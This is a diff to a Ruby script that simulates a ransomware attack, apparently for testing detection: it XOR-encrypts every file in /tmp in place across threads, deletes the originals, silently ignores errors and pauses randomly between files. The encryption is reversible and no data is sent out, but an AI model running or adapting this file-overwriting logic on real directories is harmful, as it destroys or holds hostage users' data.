@@ -37,12 +37,34 @@ def start_attack()
 	Dir.glob('/tmp/*') do |full_file_path|
 		# build thread to run the encryption program
 		threads << Thread.new { 
-			`./ransomware_mac #{full_file_path}`
-			sleep(rand(1..5))
+			# `./ransomware_mac #{full_file_path}`
+			# 
+			# Encrypt the file by XOR. Since this program is used to test ransomware attack, so 
+			# the file must be decryptable   
+			tmp_path = "#{full_file_path}.bak"
+
+			begin
+			File.open(full_file_path, 'rb') do |outfile|
+				File.open(tmp_path, 'wb') do |infile|
+			  		infile.write( 
+			  			outfile.read.bytes.collect do |byte|
+			  				byte ^ 0xFF
+			  			end.pack("C*")
+			  		)
+			  	end
+			end
+			# delete files and rename
+			File.delete(full_file_path)
+			File.rename(tmp_path, full_file_path)
 			puts "[#{cur_time}] Finished encrypting file #{full_file_path}"
+	 		rescue Exception => e
+	 			nil
+	 		end
+	 		# sleep the random second between 1 and 5, the purpose is to make the script run slowly 
+			sleep(rand(1..5))
 		}
 		
-		if threads.size > 4 then # 4 threads work simultaneously.
+		if threads.size > 0 then # 4 threads work simultaneously.
 			threads.each(&:join) # wait all the thread to finish the tasks
 			threads.clear()
 		end
@@ -51,7 +73,7 @@ end
 
 # The first step is to copy files from /usr/bin and /var/log into 
 # /tmp/ folder
-copy_files2tmp()
+#copy_files2tmp()
 
 # then start to attack 
 start_attack()
